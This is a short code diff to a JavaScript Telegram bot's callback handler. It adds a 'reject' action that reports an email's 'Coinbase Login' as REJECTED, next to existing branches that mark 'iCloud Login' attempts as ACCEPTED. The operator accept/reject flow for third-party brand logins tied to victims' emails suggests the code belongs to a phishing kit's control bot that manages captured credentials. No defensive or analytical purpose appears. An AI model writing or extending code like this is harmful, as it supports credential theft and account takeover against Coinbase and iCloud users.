@@ -104,6 +104,8 @@ bot.on("callback_query", async (query) => {
         statusMessage = `📧 <code>${email}</code> has been <b>ACCEPTED</b>! ✅`;
       } else if (action === "page2") {
         statusMessage = `📧 <code>${email}</code> has been <b>ACCEPTED</b>! ✅`;
+      } else if (action === "reject") {
+        statusMessage = `📧 <code>${email}</code> Coinbase Login <b>REJECTED</b>! ❌`;
       } else if (action === "page_accept") {
         statusMessage = `☁️ <code>${email}</code> iCloud Login <b>ACCEPTED</b>! ✅`;
         console.log(`✅ PAGE_ACCEPT matched! Message: ${statusMessage}`);
